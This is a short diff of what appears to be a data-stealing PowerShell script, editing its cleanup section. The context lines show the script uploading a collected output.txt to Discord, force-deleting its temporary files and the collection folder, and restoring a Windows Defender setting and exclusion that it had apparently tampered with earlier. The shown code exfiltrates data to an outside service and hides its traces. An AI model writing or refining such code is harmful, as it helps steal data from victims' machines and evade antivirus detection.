@@ -123,8 +123,7 @@ function Upload-Discord {
     
     Upload-Discord -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"
 # Clean up
-Remvoe-Item C:\Users\$env:UserName\Downloads\tmp
-Remove-Item -Path $dir -Recurse -Force
+Remove-Item -Path C:\Users\$env:UserName\Downloads\tmp -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
 
